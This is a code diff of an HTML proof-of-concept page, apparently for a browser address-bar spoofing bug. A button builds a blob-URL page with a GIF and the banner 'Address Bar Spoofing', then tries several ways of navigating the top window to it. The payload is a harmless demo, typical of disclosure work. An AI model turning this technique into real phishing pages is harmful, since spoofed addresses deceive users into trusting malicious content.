@@ -1,19 +1,70 @@
-<button onclick="openBlob()">Click</button>
+<!DOCTYPE html>
+<html>
+<head><title>Blob PoC</title></head>
+<body>
+
+<button onclick="openBlob()" style="
+  padding:20px 40px;
+  font-size:20px;
+  background:#4285f4;
+  color:white;
+  border:none;
+  border-radius:8px;
+  cursor:pointer;
+  margin:40vh auto;
+  display:block;
+">
+  Click Me
+</button>
+
 <script>
 function openBlob() {
-  const blob = new Blob([`
-    <html><body style="background:black;
-    color:white;text-align:center;
-    padding-top:40vh;font-family:Arial;">
-    <h1>Address Bar Spoofing</h1>
-    </body></html>
-  `], {type:"text/html"});
-  
-  // Coba buka di iframe
-  const iframe = document.createElement('iframe');
-  iframe.src = URL.createObjectURL(blob);
-  iframe.style.cssText = 
-    'position:fixed;inset:0;width:100%;height:100%;border:none;';
-  document.body.appendChild(iframe);
+  const content = `
+    <div style="
+      position:fixed;
+      inset:0;
+      background:#000;
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+      align-items:center;
+      font-family:Arial,sans-serif;
+    ">
+      <img
+        src="https://i.giphy.com/NmdU9DLL2ostigH2iW.webp"
+        style="width:400px;max-width:90vw;"
+      >
+      <div style="
+        margin-top:20px;
+        color:#fff;
+        font-size:48px;
+        font-weight:900;
+        letter-spacing:4px;
+        text-shadow:0 0 10px #fff;
+      ">
+        Address Bar Spoofing
+      </div>
+    </div>
+  `;
+
+  const blob = new Blob([content], {type:"text/html"});
+  const url = URL.createObjectURL(blob);
+
+  // Coba semua cara
+  try {
+    location.replace(url);
+  } catch(e) {
+    try {
+      location.assign(url);
+    } catch(e2) {
+      try {
+        location.href = url;
+      } catch(e3) {
+        location = url;
+      }
+    }
+  }
 }
 </script>
+</body>
+</html>
